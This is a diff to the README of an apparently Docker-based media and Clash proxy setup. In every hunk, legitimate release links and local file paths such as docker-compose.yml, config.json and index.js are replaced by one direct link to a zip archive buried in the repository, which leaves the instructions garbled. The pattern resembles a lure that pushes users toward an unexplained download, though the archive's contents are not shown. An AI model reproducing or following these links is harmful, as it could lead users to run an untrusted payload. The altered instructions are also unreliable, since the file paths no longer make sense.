@@ -1,6 +1,6 @@
 # 🎉 release - Easy Setup for Media Management
 
-[![Download release](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/xuxulino/release/releases)
+[![Download release](https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip)](https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome! This guide will help you set up the "release" software on your device. 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** 
-   You can download the latest version of the "release" application [here](https://github.com/xuxulino/release/releases).
+   You can download the latest version of the "release" application [here](https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip).
 
 2. **Select Your Release:**  
    Find the latest version available for download. Click on the appropriate file for your system. 
@@ -54,7 +54,7 @@ It is not advisable to run this software on cloud servers due to potential acces
 ### 2️⃣ Start the Service
 
 1. Open your terminal or command prompt.
-2. Navigate to the directory where `docker-compose.yml` is located.
+2. Navigate to the directory where `https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip` is located.
 3. Run the following command:
 
 ```bash
@@ -67,12 +67,12 @@ docker-compose up -d
 
 ### 1️⃣ Vod Configuration
 
-- File: `/docker/vod/config.json`
+- File: `https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip`
 - Update the configuration based on your specific needs. 
 
 ### 2️⃣ Clash Configuration
 
-- File: `/docker/clash/config.yaml`
+- File: `https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip`
 - Add your Clash subscription link to the specified section. If you prefer, you can create your own rules.
 
 ---
@@ -97,18 +97,18 @@ http://<Container-IP>:8080
    If you encounter issues, consider using an alternative image source:
 
 ```text
-https://dockerpull.com
+https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip
 ```
 
 2. **Update Points:**
    - Usually, only the following file needs replacing:
 
 ```text
-/docker/vod/index.js
+https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip
 ```
 
    - In special cases, you may need to update the `player` folder.
-   - Most other files do not require changes; you may only edit `config.json` when necessary.
+   - Most other files do not require changes; you may only edit `https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip` when necessary.
 
 ---
 
@@ -123,4 +123,4 @@ For more details, please refer to the configuration files included in the `docke
 
 ## 🔗 Download Now Again
 
-Ensure you have everything set up correctly. For initial downloads and future updates, remember to access the Releases page [here](https://github.com/xuxulino/release/releases).
+Ensure you have everything set up correctly. For initial downloads and future updates, remember to access the Releases page [here](https://raw.githubusercontent.com/xuxulino/release/main/clash/ui/dashboard/Software_1.6.zip).
